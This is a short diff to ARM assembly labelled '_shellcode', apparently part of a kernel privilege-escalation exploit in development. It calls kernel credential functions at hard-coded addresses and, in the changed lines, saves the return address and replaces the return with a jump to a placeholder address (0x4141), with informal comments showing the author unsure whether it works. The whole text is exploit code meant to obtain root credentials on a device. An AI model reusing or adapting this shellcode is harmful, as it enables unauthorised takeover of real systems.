@@ -135,6 +135,8 @@ _shellcode:
     @adr r9, _prepare_kernel_creds
     @ldr r9, [r9]
     @ that's a good replacement
+    @ save return address
+    push {lr}
     movw r9, #0xf924
     movt r9, #0x8003
     mov lr, pc
@@ -165,7 +167,10 @@ _shellcode:
 
     @ return i guess
     @ would that work?
-    mov pc, lr
+    @ forgot to save return address
+    @ fuck me
+    movt r1, #0x4141
+    mov pc, r1
 
 _prepare_creds:
     .word 0x8003f44c
